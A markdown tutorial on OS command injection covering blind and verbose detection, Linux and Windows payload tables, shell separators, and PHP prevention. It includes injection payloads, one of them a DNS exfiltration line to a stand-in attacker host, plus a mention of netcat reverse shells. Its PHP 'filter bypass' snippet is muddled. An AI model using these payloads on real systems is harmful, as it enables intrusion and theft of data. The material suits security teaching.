# OS Command Injection
Command Injection is a vulnerability that occurs when an attacker manipulates input fields to inject malicious commands into a vulnerable application.
<br>
![image](https://github.com/PranjalBasak/Documentation/assets/66166653/02292dae-1dea-4246-ae57-294ec98a348d)

## Types of Command Injection

1. **In-band Command Injection:**
   - Consists of an attacker executing commands on the host operating system via a vulnerable application and receiving the response of the command in the application.

2. **Blind Command Injection:**
   - Consists of an attacker executing commands on the host operating system via a vulnerable application that does not return the output from the command within its HTTP response.


![image](https://github.com/PranjalBasak/Documentation/assets/66166653/e55cb0d4-9403-4d31-b1bc-4398c9c6714c)

## What's Blind Command Injection?
It's when command injection goes down, but you don't see any immediate output - like, crickets. No messages from the web app, nada.

- **Making It Show Up:**
  - To catch this sneaky stuff, throw in payloads causing delays, like ping and sleep commands. For instance, make the app hang for a bit with the ping command.

- **Force Output Like a Boss:**
  - Another trick is to use redirection operators (think ">"). Force the app to spill the beans by executing commands and redirecting the output to a file. Then, sneak a peek using a command like cat.

- **Messing Around with Curl:**
  - Test for command injection with the curl command. It lets you sling data to and from the app in your payload. Check this out - a simple curl payload for command injection testing:

```bash
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
```

## Detecting Verbose Command Injection

Detecting command injection this way is probably the easier one of the two. Verbose command injection happens when the app spills the beans, giving you feedback or output about what's going on or being executed.

For instance, when you run commands like ping or whoami, the web app spills the details right on its interface.

### Useful Payloads

I've got some handy payloads for both Linux and Windows in the tables below.

#### Linux

| Payload | Description |
|---------|-------------|
| whoami  | See what user the app is running under. |
| ls      | List the contents of the current directory. Hunt for config files, environment files (like tokens and app keys), and other juicy stuff. |
| ping    | Make the app hang. Great for testing blind command injection. |
| sleep   | Another one for testing blind command injection, especially when ping is MIA. |
| nc      | Netcat can spawn a reverse shell on the vulnerable app. Use it to navigate around the target machine for services, files, or potential privilege escalation. |

#### Windows

| Payload | Description |
|---------|-------------|
| whoami  | See what user the app is running under. |
| dir     | List the contents of the current directory. Dig for config files, environment files, and other valuable goodies. |
| ping    | Make the app hang. Useful for testing blind command injection. |
| timeout | Another app-freezing command. Handy for blind command injection tests if ping isn't around. |

| Purpose of command      | Linux            | Windows           |
|-------------------------|------------------|-------------------|
| Name of current user    | whoami           | whoami            |
| Operating system        | uname -a          | ver               |
| Network configuration    | ifconfig         | ipconfig /all     |
| Network connections     | netstat -an      | netstat -an       |
| Running processes        | ps -ef           | tasklist          |

### Injection Techniques

Use various shell metacharacters for OS command injection:

- Command separators (work on both systems): `&`, `&&`, `|`, `||`
- Unix-only separators: `;`, Newline (`\n`)
- Inline execution (Unix-only): `` `injected command` ``, `$(injected command)`

Considerations for special characters within quoted contexts in original commands.

## Blind OS Command Injection on Vulnerable Websites

### Overview

Many instances of OS command injection are blind vulnerabilities, meaning that the application doesn't display the command output in its HTTP responses. Despite this, blind vulnerabilities can still be exploited using various techniques.

### Example Scenario

Consider a website where users can submit feedback. The server-side application generates an email to an administrator using a command like:

```bash
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

Since the command output isn't in the application's responses, traditional echo payloads won't work. Alternative techniques are needed.

### Techniques for Detection and Exploitation

1. **Detecting with Time Delays:**
   - Use time delays triggered by an injected command.
   - Example: `& ping -c 10 127.0.0.1 &`

2. **Redirecting Output:**
   - Redirect command output to a retrievable file in the web root.
   - Example: `& whoami > /var/www/static/whoami.txt &`

3. **Out-of-Band (OAST) Interaction:**
   - Trigger an out-of-band network interaction.
   - Example: `& nslookup kgji2ohoyw.web-attacker.com &`

4. **Out-of-Band Data Exfiltration:**
   - Use DNS lookups to exfiltrate command output.
   - Example: `& nslookup \`whoami\`.kgji2ohoyw.web-attacker.com &`



### Prevention Measures

The most effective prevention is to avoid calling OS commands from application-layer code. If unavoidable:

- Perform strong input validation.
- Examples: Whitelisting permitted values, validating as a number, allowing only alphanumeric characters.
- Never attempt to sanitize input by escaping shell metacharacters; it's error-prone and easily bypassed.

**Note:** The provided examples and techniques are for educational purposes. Always adhere to ethical hacking practices and obtain proper authorization before testing on any system.

### Preventing Command Injection

#### Vulnerable Functions in PHP

In PHP, certain functions like `exec`, `passthru`, and `system` interact with the OS, potentially executing commands via shell. For example, in the snippet below, the app only accepts and processes numerical input, avoiding command execution:

![image](https://github.com/PranjalBasak/Documentation/assets/66166653/36d52ee5-a8c5-4485-8d6b-24542d214fa4)


#### Input Sanitization

Sanitizing user input is key to preventing command injection. Specify accepted data formats, like allowing only numerical input or removing special characters such as > ,  & and /.:

```php
// Use filter_input to check if submitted data is a number
$input = filter_input(INPUT_POST, 'user_input', FILTER_VALIDATE_INT);

if ($input !== false) {
    // Valid numerical input, proceed
} else {
    // Invalid input, reject
}
```

#### Bypassing Filters

While applications use filters to restrict payloads, it's possible to bypass them. For instance, if an app strips out quotation marks, using their hexadecimal values can achieve the same result:

```php
// Example of bypassing filters using hexadecimal values
$userInput = str_replace('\x22', '"', $_POST['user_input']);

// Process userInput
```

Keep in mind the importance of thorough input validation and regularly update your defense mechanisms against evolving techniques.

Payload List: https://github.com/payloadbox/command-injection-payload-list
